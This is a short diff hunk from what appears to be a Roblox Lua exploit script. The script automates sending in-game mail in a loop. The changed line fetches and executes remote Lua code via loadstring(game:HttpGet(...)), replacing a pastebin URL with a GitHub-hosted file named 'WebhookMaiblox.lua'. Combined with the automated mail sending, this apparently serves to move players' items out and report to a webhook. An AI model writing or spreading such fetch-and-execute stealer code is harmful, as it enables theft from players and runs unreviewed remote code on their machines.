@@ -61,7 +61,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                 }
             }
         Networking.Invoke("Send Mail", unpack(args))
-        loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Arkhalislua/Arkhalislua.github.io/main/WebhookMaiblox.lua"))()
         dims = 0
         wait(7)
     end
